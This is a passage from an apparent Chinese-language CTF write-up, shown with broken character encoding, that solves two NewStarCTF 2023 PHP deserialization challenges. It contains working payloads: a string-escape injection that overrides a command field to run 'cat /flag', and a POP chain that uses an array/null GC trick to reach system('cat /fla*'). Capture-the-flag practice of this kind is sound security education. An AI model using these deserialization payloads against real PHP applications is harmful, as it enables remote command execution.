<p>**æ³¨æ„ï¼š**åœ¨æäº¤ payload çš„è¯·æ±‚åç›´æ¥åˆ·æ–°ç½‘é¡µå¹¶ä¸ä¼šè·å–åˆ°ä¸Šé¢çš„æ•°æ®ï¼Œè¿™æ˜¯å› ä¸ºç½‘é¡µå¯ç”¨äº†ç¼“å­˜ï¼Œä¼šå‘é€æœ¬åœ°ç¼“å­˜ä¸­æœ€æ™šæ—¶é—´çš„<code>info</code>è¯·æ±‚ã€‚å¦‚æœæƒ³è¦é€šè¿‡åˆ·æ–°ç½‘é¡µè·å–æ•°æ®ï¼Œåªéœ€è¦åœ¨<code>å¼€å‘è€…å·¥å…· -&gt; åº”ç”¨ç¨‹åº -&gt; å­˜å‚¨</code>ä¸­æ¸…é™¤ç½‘ç«™æ•°æ®ç„¶ååˆ·æ–°ç½‘é¡µå³å¯ã€‚</p>
<p>åªèƒ½è¯´ï¼Œé‡åˆ°è¿™ç§é¢˜ï¼Œå¾ˆè€ƒéªŒä»£ç å®¡è®¡åŠŸåº•ï¼Œå…ˆä¸è¯´æŠ€æœ¯å¦‚ä½•ï¼Œä¸€å †å †çš„ä»£ç éœ€è¦è¶³å¤Ÿçš„è€å¿ƒå»å®¡ï¼Œè¦ä¸æ˜¯æˆ‘é ç€wpï¼Œæˆ‘ä¼°è®¡å°±ç–¯æ‰äº†ã€‚ã€‚ã€‚ã€‚ï¼Œå”‰ï¼Œè¿˜æ˜¯ç¼ºä¹å­¦ä¹ çš„ç²¾ç¥ã€‚</p>
<h2 id="week4web-é€ƒ">WEEK4|WEB-é€ƒ</h2>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>{
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"bad"</span>,<span class="hljs-string">"good"</span>,<span class="hljs-variable">$str</span>);
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetFlag</span> </span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$key</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">"whoami"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;cmd);
    }
}

<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">GetFlag</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'key'</span>])))); www-data www-data</code></pre>
<p>é¡¾åæ€ä¹‰ï¼Œè¿™é“é¢˜å°±æ˜¯ç®€å•çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ï¼Œé¦–å…ˆæˆ‘ä»¬å…ˆæœ¬åœ°è¿è¡Œä¸€ä¸‹çœ‹çœ‹ï¼Œåºåˆ—åŒ–å­—ç¬¦ä¸²ç»“æ„</p>
<p>![image-20231106200131159](NewStarCTF 2023/image-20231106200131159.png)</p>
<p>å¯ä»¥çœ‹åˆ°å…¶ä¸­çš„cmdå¹¶ä¸å¯æ§ï¼Œä½†ç”±äºwafçš„å­˜åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥å®ç°å­—ç¬¦ä¸²é€ƒé€¸ï¼Œå°†åç»­çš„<code>s:3:"cmd";s:6:"whoami";}</code>è¸¢å‡ºå»</p>
<p>æˆ‘ä»¬çœ‹å¦‚ä¸‹</p>
<p>![image-20231106200324320](NewStarCTF 2023/image-20231106200324320.png)</p>
<p>å¦‚ä¸Šå›¾ï¼Œs:6ä½†åç»­çš„goodgoodæ˜¯å…«ä¸ªï¼Œé‚£æœ€åçš„ä¸¤ä¸ªodå­—ç¬¦å°±ä¼šè¢«æŠ›å¼ƒï¼Œå½“ç„¶ï¼Œæ­¤æ—¶çš„åºåˆ—åŒ–å­—ç¬¦ä¸²ä¹Ÿå› ä¸ºè¿™ä¸ªåŸå› å˜å¾—ä¸åˆæ³•ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦åˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹æ¥æ„é€ å‡ºåˆæ³•çš„å­—ç¬¦ä¸²å»ä¿®æ”¹cmdçš„å€¼ã€‚</p>
<p>æˆ‘ä»¬æƒ³è¾¾åˆ°çš„payloadä¸ºï¼š<code>";s:3:"cmd";s:2:"ls";}</code>å…±22ä¸ªå­—ç¬¦ï¼Œè€Œbadæ¢æˆgoodå¤šäº†ä¸€ä¸ªå­—ç¬¦ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æ22ä¸ªbadå³å¯ï¼Œpayloadå¦‚ä¸‹ï¼š</p>
<pre><code class="hljs plaintext">badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:2:"ls";}

badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:9:"cat /flag";}</code></pre>
<p>![image-20231106201141230](NewStarCTF 2023/image-20231106201141230.png)</p>
<p>æ‹¿åˆ°flag</p>
<h2 id="week4web-more-fast">WEEK4|WEB-More Fast</h2>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errMsg</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;errMsg);
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pwn</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">evil</span>();
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-title function_ invoke__">phpinfo</span>();
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reverse</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>) </span>{
        (<span class="hljs-variable language_">$this</span>-&gt;func)();
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Web</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/flag/i"</span>,<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>)){
            (<span class="hljs-variable language_">$this</span>-&gt;func)(<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">var</span>);
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Not Flag"</span>;
        }
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-variable">$wel</span> = <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;good;
        <span class="hljs-keyword">return</span> <span class="hljs-string">"NewStar"</span>;
    }
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Misc</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">evil</span>(<span class="hljs-params"></span>) </span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"good job but nothing"</span>;
    }
}

<span class="hljs-variable">$a</span> = @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'fast'</span>]);
<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">"Nope"</span>);
Fatal error: Uncaught <span class="hljs-built_in">Exception</span>: Nope in /<span class="hljs-keyword">var</span>/www/html/index.php:<span class="hljs-number">55</span> Stack trace: <span class="hljs-comment">#0 {main} thrown in /var/www/html/index.php on line 55</span></code></pre>
<p>ç®€å•åˆ†æä¸€ä¸‹é“¾å­ï¼Œpopé“¾å­å¦‚ä¸‹ï¼š<code>start.die-&gt;Crypto.toString-&gt;Reverse.get-&gt;Pwn.invoke-&gt;web.evil</code></p>
<p>å°±åœ¨æˆ‘ä»¥ä¸ºè¿™é“é¢˜å¾ˆç®€å•çš„æ—¶å€™ï¼Œè¿˜æ˜¯ç¿»è½¦äº†ï¼Œåœ¨ä¼ å…¥ä¸Šè¿°payloadæ— æœåï¼Œæˆ‘æ³¨æ„åˆ°äº†<code>throw new Exception("Nope");</code>ï¼Œå› ä¸ºæ­¤å‰å¹¶æ²¡æœ‰è§è¿‡ï¼Œä½†æˆ‘è‚¯å®šé—®é¢˜å°±æ˜¯è¿™é‡Œäº†ï¼Œäºæ˜¯å…³é”®è¯æœäº†æœï¼Œå‘ç°æ˜¯GCåƒåœ¾å›æ”¶æœºåˆ¶åœ¨ä½œæ€ªã€‚è¿™é‡Œä¹Ÿæ²¡æœ‰å¾ˆæ¸…æ¥šçš„ææ˜ç™½æ˜¯æ€ä¹ˆä¸€å›äº‹ï¼Œè¿™é‡Œæˆ‘å…ˆå¤ç°å‡ºæ¥åœ¨æ€è€ƒå§ã€‚</p>
<p>æ–‡ç« è¯´è¿™é‡Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨çš„å»é”€æ¯å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯æ˜¯ä½¿ç”¨æ•°ç»„ç»•è¿‡ï¼špayloadå¦‚ä¸‹</p>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$errMsg</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pwn</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reverse</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Web</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Crypto</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Misc</span></span>{
}

<span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();
<span class="hljs-variable">$poc</span>-&gt;errMsg = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Crypto</span>();
<span class="hljs-variable">$poc</span>-&gt;errMsg-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reverse</span>();
<span class="hljs-variable">$poc</span>-&gt;errMsg-&gt;obj-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pwn</span>();
<span class="hljs-variable">$poc</span>-&gt;errMsg-&gt;obj-&gt;func-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Web</span>();
<span class="hljs-variable">$poc</span>-&gt;errMsg-&gt;obj-&gt;func-&gt;obj-&gt;func = <span class="hljs-string">'system'</span>;
<span class="hljs-variable">$poc</span>-&gt;errMsg-&gt;obj-&gt;func-&gt;obj-&gt;<span class="hljs-keyword">var</span> = <span class="hljs-string">'ls'</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>);

<span class="hljs-meta">?&gt;</span></code></pre>
<p>è¿™é‡Œæˆ‘ä»¬æœ€å…ˆçš„payloadï¼Œè¿™é‡Œåšå¦‚ä¸‹ä¿®æ”¹<code>serialize(array($poc, null));</code> å¾—åˆ°</p>
<pre><code class="hljs php">a:<span class="hljs-number">2</span>:{i:<span class="hljs-number">0</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">"Start"</span>:<span class="hljs-number">1</span>:{s:<span class="hljs-number">6</span>:<span class="hljs-string">"errMsg"</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">"Crypto"</span>:<span class="hljs-number">1</span>:{s:<span class="hljs-number">3</span>:<span class="hljs-string">"obj"</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">"Reverse"</span>:<span class="hljs-number">1</span>:{s:<span class="hljs-number">4</span>:<span class="hljs-string">"func"</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">"Pwn"</span>:<span class="hljs-number">1</span>:{s:<span class="hljs-number">3</span>:<span class="hljs-string">"obj"</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">"Web"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">4</span>:<span class="hljs-string">"func"</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">"system"</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">"var"</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">"ls"</span>;}}}}}i:<span class="hljs-number">1</span>;N;}</code></pre>
<p>æ¥ç€å°†åç»­çš„1æ”¹ä¸º0</p>
<pre><code class="hljs php">a:<span class="hljs-number">2</span>:{i:<span class="hljs-number">0</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">"Start"</span>:<span class="hljs-number">1</span>:{s:<span class="hljs-number">6</span>:<span class="hljs-string">"errMsg"</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">"Crypto"</span>:<span class="hljs-number">1</span>:{s:<span class="hljs-number">3</span>:<span class="hljs-string">"obj"</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">"Reverse"</span>:<span class="hljs-number">1</span>:{s:<span class="hljs-number">4</span>:<span class="hljs-string">"func"</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">"Pwn"</span>:<span class="hljs-number">1</span>:{s:<span class="hljs-number">3</span>:<span class="hljs-string">"obj"</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">"Web"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">4</span>:<span class="hljs-string">"func"</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">"system"</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">"var"</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">"ls"</span>;}}}}}i:<span class="hljs-number">0</span>;N;}</code></pre>
<p>![image-20231106204545388](NewStarCTF 2023/image-20231106204545388.png)</p>
<p>æˆåŠŸå›æ˜¾ï¼Œæœ€ç»ˆpayload</p>
<pre><code class="hljs php">a:<span class="hljs-number">2</span>:{i:<span class="hljs-number">0</span>;O:<span class="hljs-number">5</span>:<span class="hljs-string">"Start"</span>:<span class="hljs-number">1</span>:{s:<span class="hljs-number">6</span>:<span class="hljs-string">"errMsg"</span>;O:<span class="hljs-number">6</span>:<span class="hljs-string">"Crypto"</span>:<span class="hljs-number">1</span>:{s:<span class="hljs-number">3</span>:<span class="hljs-string">"obj"</span>;O:<span class="hljs-number">7</span>:<span class="hljs-string">"Reverse"</span>:<span class="hljs-number">1</span>:{s:<span class="hljs-number">4</span>:<span class="hljs-string">"func"</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">"Pwn"</span>:<span class="hljs-number">1</span>:{s:<span class="hljs-number">3</span>:<span class="hljs-string">"obj"</span>;O:<span class="hljs-number">3</span>:<span class="hljs-string">"Web"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">4</span>:<span class="hljs-string">"func"</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">"system"</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">"var"</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">"cat /fla*"</span>;}}}}}i:<span class="hljs-number">0</span>;N;}
<span class="hljs-comment">//é€šé…ç¬¦ç»•è¿‡</span></code></pre>
<p>![image-20231106204623504](NewStarCTF 2023/image-20231106204623504.png)</p>
<p>æ¥ä¸‹æ¥å¼€å§‹ä»”ç»†æ€è€ƒäº†ï¼Œç›¸å…³æ–‡ç« æ˜¯è¿™æ ·è¯´çš„ï¼š</p>
<pre><code class="hljs plaintext">åœ¨phpä¸­ï¼Œå½“å¯¹è±¡è¢«é”€æ¯æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨__destruct()æ–¹æ³•ï¼Œä½†å¦‚æœç¨‹åºæŠ¥é”™æˆ–è€…æŠ›å‡ºå¼‚å¸¸ï¼Œå°±ä¸ä¼šè§¦å‘è¯¥é­”æœ¯æ–¹æ³•ã€‚

å½“ä¸€ä¸ªç±»åˆ›å»ºä¹‹åå®ƒä¼šè‡ªå·±æ¶ˆå¤±ï¼Œè€Œ __destruct() é­”æœ¯æ–¹æ³•çš„è§¦å‘æ¡ä»¶å°±æ˜¯ä¸€ä¸ªç±»è¢«é”€æ¯æ—¶è§¦å‘ï¼Œè€Œthrowé‚£ä¸ªå‡½æ•°å°±æ˜¯å›æ”¶äº†è‡ªåŠ¨é”€æ¯çš„ç±»ï¼Œå¯¼è‡´destructæ£€æµ‹ä¸åˆ°æœ‰ä¸œè¥¿é”€æ¯ï¼Œä»è€Œä¹Ÿå°±å¯¼è‡´æ— æ³•è§¦å‘destructå‡½æ•°ã€‚

æˆ‘ä»¬å¯ä»¥é€šè¿‡æå‰è§¦å‘åƒåœ¾å›æ”¶æœºåˆ¶æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œä»è€Œç»•è¿‡GCå›æ”¶ï¼Œå”¤é†’__destruct()é­”æœ¯æ–¹æ³•ã€‚

è§¦å‘åƒåœ¾å›æ”¶æœºåˆ¶çš„æ–¹æ³•æœ‰ï¼šï¼ˆæœ¬è´¨å³ä½¿å¯¹è±¡å¼•ç”¨è®¡æ•°å½’é›¶ï¼‰

ï¼ˆ1ï¼‰å¯¹è±¡è¢«unset()å¤„ç†æ—¶ï¼Œå¯ä»¥è§¦å‘ã€‚

ï¼ˆ2ï¼‰æ•°ç»„å¯¹è±¡ä¸ºNULLæ—¶ï¼Œå¯ä»¥è§¦å‘ã€‚</code></pre>
<p>è¿™é‡Œåœ¨æ€»ç»“ä¸€ä¸‹destructé­”æœ¯æ–¹æ³•çš„è°ƒç”¨æƒ…å†µï¼š</p>
<pre><code class="hljs plaintext">1.ä¸»åŠ¨è°ƒç”¨unset($obj)
2.ä¸»åŠ¨è°ƒç”¨$obj = NULL
3.ç¨‹åºè‡ªåŠ¨ç»“æŸ</code></pre>
<p>é™¤æ­¤ä¹‹å¤–ï¼ŒPHPè¿˜æ‹¥æœ‰<strong>åƒåœ¾å›æ”¶Garbage collection</strong>å³æˆ‘ä»¬å¸¸è¯´çš„<strong>GCæœºåˆ¶</strong>ã€‚</p>
<p>PHPä¸­GCä½¿ç”¨å¼•ç”¨è®¡æ•°å’Œå›æ”¶å‘¨æœŸè‡ªåŠ¨ç®¡ç†å†…å­˜å¯¹è±¡ï¼Œé‚£ä¹ˆè¿™æ—¶å€™å½“æˆ‘ä»¬çš„å¯¹è±¡å˜æˆäº†â€œåƒåœ¾â€ï¼Œå°±ä¼šè¢«GCæœºåˆ¶è‡ªåŠ¨å›æ”¶æ‰ï¼Œå›æ”¶è¿‡ç¨‹ä¸­ï¼Œå°±ä¼šè°ƒç”¨å‡½æ•°çš„<code>__destruct</code>ã€‚</p>
<p>åˆšæ‰æˆ‘ä»¬æåˆ°äº†å¼•ç”¨è®¡æ•°ï¼Œå…¶å®<strong>å½“ä¸€ä¸ªå¯¹è±¡æ²¡æœ‰ä»»ä½•å¼•ç”¨</strong>çš„æ—¶å€™ï¼Œåˆ™ä¼šè¢«è§†ä¸ºâ€œåƒåœ¾â€ï¼Œå³</p>
<pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();</code></pre>
<p><code>test</code> å¯¹è±¡è¢« å˜é‡ <code>a</code> å¼•ç”¨ï¼Œ æ‰€ä»¥è¯¥å¯¹è±¡ä¸æ˜¯â€œåƒåœ¾â€ï¼Œè€Œå¦‚æœæ˜¯è¿™æ ·</p>
<pre><code class="hljs php"><span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();</code></pre>
<p>æˆ–è¿™æ ·</p>
<pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>();
<span class="hljs-variable">$a</span> = <span class="hljs-number">1</span>;</code></pre>
<p>è¿™æ ·åœ¨ <code>test</code> åœ¨æ²¡æœ‰è¢«å¼•ç”¨æˆ–åœ¨å¤±å»å¼•ç”¨æ—¶ä¾¿ä¼šè¢«å½“ä½œâ€œåƒåœ¾â€è¿›è¡Œå›æ”¶</p>
<p>å¦‚ï¼š</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>{
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$i</span></span>) </span>{<span class="hljs-variable language_">$this</span>-&gt;i = <span class="hljs-variable">$i</span>; }
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>{ <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;i.<span class="hljs-string">"Destroy...\n"</span>; }
}
<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">'1'</span>);
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">'2'</span>);
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">test</span>(<span class="hljs-string">'3'</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”&lt;br/&gt;"</span>;</code></pre>
<p>è¾“å‡º</p>
<pre><code class="hljs none">1Destroy...
2Destroy...
â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”
3Destroy...</code></pre>
<p>è¿™é‡Œæ˜¯å½“<code>a</code>ç¬¬äºŒæ¬¡èµ‹å€¼æ—¶,<code>test('2')</code>å¤±å»å¼•ç”¨ï¼Œæ‰§è¡Œ<code>__destruct</code>,ç„¶åæ‰§è¡Œ<code>echo</code>,å½“ç¨‹åºå®Œäº†å<code>test('3')</code>é”€æ¯ï¼Œæ‰§è¡Œå®ƒçš„<code>__destruct</code></p>
<p>ä¸¾ä¸ªæ —å­ï¼š</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'success!!'</span>;
    }
}
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'input'</span>])) {
    <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">'input'</span>]);
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">'lose'</span>);
}</code></pre>
<p>è¿™é‡Œæˆ‘ä»¬è¦æ±‚è¾“å‡º <code>success!!</code> ï¼Œä½†æ‰§è¡Œååºåˆ—åŒ–åå¾—åˆ°çš„å¯¹è±¡æœ‰äº†å¼•ç”¨ï¼Œç»™äº† <code>a</code> å˜é‡ï¼Œåé¢ç¨‹åºæ¥ç€å°±æŠ›å‡ºä¸€ä¸ªå¼‚å¸¸ï¼Œéæ­£å¸¸ç»“æŸï¼Œå¯¼è‡´æœªæ­£å¸¸å®Œæˆ GC æœºåˆ¶ï¼Œå³æ²¡æœ‰æ‰§è¡Œ <code>__destruct</code> ã€‚</p>
<p>ç›´æ¥æ„é€ ååºåˆ—åŒ– test ç±»å¾—åˆ°ï¼ˆè¿™é‡Œéƒ½æ˜¯å€Ÿç”¨çš„æ–‡ç« ä¾‹å­</p>
<p>![image-20231106212531886](NewStarCTF 2023/image-20231106212531886.png)</p>
<p>æ‰€ä»¥æˆ‘ä»¬è¦ååºåˆ—åŒ–æ‰‹åŠ¨å» â€œé”€æ¯â€ åˆ›é€ çš„å¯¹è±¡ã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ•°ç»„æ¥å®Œæˆã€‚æ„é€ </p>
<pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span> </span>{}
<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> test, <span class="hljs-literal">null</span>));
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.<span class="hljs-string">'&lt;br/&gt;'</span>;
<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">':1'</span>, <span class="hljs-string">':0'</span>, <span class="hljs-variable">$a</span>);<span class="hljs-comment">//å°†åºåˆ—åŒ–çš„æ•°ç»„ä¸‹æ ‡ä¸º0çš„å…ƒç´ ç»™ä¸ºnull</span>
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;</code></pre>
<p>å¾—åˆ°</p>
<pre><code class="hljs php">a:<span class="hljs-number">2</span>:{i:<span class="hljs-number">0</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">"test"</span>:<span class="hljs-number">0</span>:{}i:<span class="hljs-number">1</span>;N;}
a:<span class="hljs-number">2</span>:{i:<span class="hljs-number">0</span>;O:<span class="hljs-number">4</span>:<span class="hljs-string">"test"</span>:<span class="hljs-number">0</span>:{}i:<span class="hljs-number">0</span>;N;}<span class="hljs-comment">//æœ€ç»ˆpayload</span></code></pre>
<p>ä¼ å…¥ï¼ŒæˆåŠŸå¾—åˆ° success!!</p>
<p>![image-20231106212541970](NewStarCTF 2023/image-20231106212541970.png)</p>
<p>æˆ‘ä»¬åºåˆ—åŒ–ä¸€ä¸ªæ•°ç»„å¯¹è±¡ï¼Œè€ƒè™‘ååºåˆ—åŒ–æœ¬å­—ç¬¦ä¸²ï¼Œå› ä¸º<strong>ååºåˆ—åŒ–çš„è¿‡ç¨‹æ˜¯é¡ºåºæ‰§è¡Œ</strong>çš„ï¼Œæ‰€ä»¥åˆ°ç¬¬ä¸€ä¸ªå±æ€§æ—¶ï¼Œä¼šå°†<code>Array[0]</code>è®¾ç½®ä¸ºå¯¹è±¡ï¼ŒåŒæ—¶æˆ‘ä»¬åˆå°†<code>Array[0]</code>è®¾ç½®ä¸º<code>null</code>ï¼Œè¿™æ ·å‰é¢çš„<code>test</code>å¯¹è±¡ä¾¿ä¸¢å¤±äº†å¼•ç”¨ï¼Œå°±ä¼šè¢«GCæ‰€æ•è·ï¼Œå°±å¯ä»¥æ‰§è¡Œ<code>__destruct</code>äº†ã€‚</p>
<p>è‡³äºå…·ä½“çš„GCæœºåˆ¶åŸç†ï¼Œè¿™é‡Œæˆ‘ä¹Ÿä¸æƒ³æ·±ç©¶äº†ï¼ˆå› ä¸ºæ‡’ï¼Œå¦‚æœæ—¥åæœ‰ç¼˜åœ¨å­¦ä¹ å§ï¼Œä¸è¿‡ç›¸å…³åŸç†æ–‡ç« æˆ‘ä¼šé™„åœ¨ä¸‹é¢çš„</p>
